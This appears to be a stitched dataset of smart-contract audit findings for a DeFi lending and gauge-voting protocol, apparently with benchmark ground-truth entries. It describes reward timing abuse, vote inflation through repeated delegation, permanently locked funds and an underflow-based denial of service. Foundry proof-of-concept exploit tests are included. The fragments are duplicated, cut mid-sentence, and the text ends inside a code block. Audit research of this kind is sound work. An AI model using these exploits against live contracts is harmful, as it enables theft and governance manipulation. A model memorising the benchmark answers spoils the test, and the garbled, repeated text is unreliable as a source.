Rewards are distributed for each week during which the deposit was inside the market. However, the user can cheat this condition because we are rounding down to the start of the week, so the user can deposit at 23:59 at the end of the week and withdraw at 00:00 and still get rewarded as if he had his deposit for the whole week.\n\n## Proof of Concept\nTest case for the `LendingLedger.t.sol`\n```\n    function setupStateBeforeClaim() internal {\n        whiteListMarket();\n\n        vm.prank(goverance);\n        ledger.setRewards(0, WEEK*10, amountPerEpoch);\n\n        // deposit into market at 23:59 (week 4)\n        vm.warp((WEEK * 5) - 1);\n\n        int256 delta = 1.1 ether;\n        vm.prank(lendingMarket);\n        ledger.sync_ledger(lender, delta);\n\n        // airdrop ledger enough token balance for user to claim\n        payable(ledger).transfer(1000 ether);\n        // withdraw at 00:00 (week 5)\n        vm.warp(block.timestamp + 1);\n        vm.prank(lendingMarket);\n        ledger.sync_ledger(lender, delta * (-1));\n    }\n\n    function testClaimValidLenderOneEpoch() public {\n        setupStateBeforeClaim();\n\n        uint256 balanceBefore = address(lender).balance;\n        vm.prank(lender);\n        ledger.claim(lendingMarket, 0, type(uint256).max);\n        uint256 balanceAfter = address(lender).balance;\n        assertTrue(balanceAfter - balanceBefore == 1 ether);\n\n        uint256 claimedEpoch = ledger.userClaimedEpoch(lendingMarket, lender);\n        assertTrue(claimedEpoch - WEEK*4 == WEEK);\n    }\n```\n## Tools Used\nFoundry\n## Recommended Mitigation Steps\nIt's difficult to propose a solution for this exploit without major changes in the contract's architecture. Perhaps we can somehow split the amount based on the time the sync was made inside the week, let's say Alice's `last_sync` was in the middle of week0, she deposited 1 ether, thus her amount for the current epoch will be 1/2 ether. However there is a caveat, how do we fill the gaps? We can't fill them with 1/2 ether. We can use this struct though,\n```\nAmount {\n    uint256 actualAmount,\n    uint256 fraction\n}\n```\nso we can use `fraction` for the current epoch and `actualAmount = 1 ether` to fill the gaps. \n\n\n## Assessed type\n\nTiming",

Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on.

Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

It will go through the entirety of the loop and `t` will increase +1 week for every iteration. The problem is that even after 500 iterations `t` will be `< block.timestamp` so the value of `time_weight[_gauge_addr]` will remain 0. Unless admins call manually `_change_gauge_weight` to set an initial value, `time_weight[_gauge_addr]` will remain 0.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

If the delegatee is being changed to the sender itself, the function recognizes it as a delegation or undelegation scenario and updates the corresponding LockedBalance structs accordingly.\n\nThe global counter of locked assets is not explicitly mentioned in the code, but the logic of handling locked amounts is implemented correctly. When updating locks, the code uses `int128 value = locked_.amount;` to maintain the original locked amount value, and it checks if the delegatee's lock is long enough to accept the delegation.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

When the user tries to re-delegate, either to someone else or themselves, the lock must not be expired. This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.\n\n## Proof of Concept\nTo exit the system, Alice must call `withdraw()`. However, since they've delegated, they will not be able to.\n```solidity\nfunction withdraw() external nonReentrant {\n\t...\n\trequire(locked_.delegatee == msg.sender, \"Lock delegated\");\n\t...\n}\n```\nTo re-delegate to themselves (undelegate), they call `delegate(alice.address)`. However, there is a check to see if `toLocked.end` has expired, which would be true since it would point to Alice's lock.\n```\nfunction delegate(address _addr) external nonReentrant {\n\tLockedBalance memory locked_ = locked[msg.sender];\n\t...\n\tLockedBalance memory fromLocked;\n\tLockedBalance memory toLocked;\n\tlocked_.delegatee = _addr;\n\tif (delegatee == msg.sender) {\n\t\t...\n\t// @audit this else if will execute\n\t} else if (_addr == msg.sender) {\n\t\t// Undelegate\n\t\tfromLocked = locked[delegatee]; // @audit Delegatee\n\t\ttoLocked = locked_; // @audit Alice's lock\n\t}\n\t...\n\trequire(toLocked.end > block.timestamp, \"Delegatee lock expired\");\n```\n\nThis is a test to be added into VoteEscrow.t.sol. It can be manually run by executing `forge test --match-test testUnSuccessUnDelegate`. \n```solidity\nfunction testUnSuccessUnDelegate() public {\n\ttestSuccessDelegate();\n\tvm.warp(ve.LOCKTIME() + 1 days);\n\n\t// Try to undelegate\n\tvm.startPrank(user1);\n\tvm.expectRevert(\"Delegatee lock expired\");\n\tve.delegate(user1);\n\n\t// Still user2\n\t(, , , address delegatee) = ve.locked(user1);\n\tassertEq(delegatee, user2);\n}\n```\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nConsider refactoring the code to skip `toLocked.end > block.timestamp` if undelegating. For example, adding a small delay (e.g., 1 second) to the lock end time when a user undelegates.\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nTiming",

The function first retrieves the user's locked balance and performs some input validations to ensure that the lock exists, has not expired, and is not delegated to another user.\n\nAfter the input validations, the function updates the user's locked balance by setting the `amount` and `end` fields to 0, and adjusting the `delegated` field to remove the withdrawn amount. The function then checks the old and new locked balances and sends the withdrawn amount to the user's address.\n\nThere does not appear to be any issue with the way the user's staked amount is being updated in the function. The `amount` field is being set to 0, which is the correct behavior for an unstaking event. Therefore, the function does not appear to be vulnerable to the described issue of locked tokens in the contract due to incorrectly updating user staked amounts.\n\nHowever, it is important to note that the function does include a low-level `call` to send the withdrawn amount to the user's address.

This ensures that the user's unvested tokens remain accessible for future unstaking events.\n\nFurthermore, the function calls the `_checkpoint` function, which appears to be designed to track the user's staking history. This function takes the `locked_` and `newLocked` variables as arguments, which represent the user's lock before and after the withdrawal, respectively. This ensures that the user's staking history is accurately recorded, even after they have withdrawn their funds.\n\nTherefore, based on the given code, it does not appear that the described vulnerability exists. However, it is always possible that the vulnerability exists in other parts of the smart contract or in the interactions between this contract and other contracts.

When the user tries to re-delegate, either to someone else or themselves, the lock must not be expired. This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.\n\n## Proof of Concept\nTo exit the system, Alice must call `withdraw()`. However, since they've delegated, they will not be able to.\n```solidity\nfunction withdraw() external nonReentrant {\n\t...\n\trequire(locked_.delegatee == msg.sender, \"Lock delegated\");\n\t...\n}\n```\nTo re-delegate to themselves (undelegate), they call `delegate(alice.address)`. However, there is a check to see if `toLocked.end` has expired, which would be true since it would point to Alice's lock.\n```\nfunction delegate(address _addr) external nonReentrant {\n\tLockedBalance memory locked_ = locked[msg.sender];\n\t...\n\tLockedBalance memory fromLocked;\n\tLockedBalance memory toLocked;\n\tlocked_.delegatee = _addr;\n\tif (delegatee == msg.sender) {\n\t\t...\n\t// @audit this else if will execute\n\t} else if (_addr == msg.sender) {\n\t\t// Undelegate\n\t\tfromLocked = locked[delegatee]; // @audit Delegatee\n\t\ttoLocked = locked_; // @audit Alice's lock\n\t}\n\t...\n\trequire(toLocked.end > block.timestamp, \"Delegatee lock expired\");\n```\n\nThis is a test to be added into VoteEscrow.t.sol. It can be manually run by executing `forge test --match-test testUnSuccessUnDelegate`. \n```solidity\nfunction testUnSuccessUnDelegate() public {\n\ttestSuccessDelegate();\n\tvm.warp(ve.LOCKTIME() + 1 days);\n\n\t// Try to undelegate\n\tvm.startPrank(user1);\n\tvm.expectRevert(\"Delegatee lock expired\");\n\tve.delegate(user1);\n\n\t// Still user2\n\t(, , , address delegatee) = ve.locked(user1);\n\tassertEq(delegatee, user2);\n}\n```\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nConsider refactoring the code to skip `toLocked.end > block.timestamp` if undelegating. For example, adding a small delay (e.g., 1 second) to the lock end time when a user undelegates.\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nTiming",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

        "gt": "\n# Vulnerability details\n\n`_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        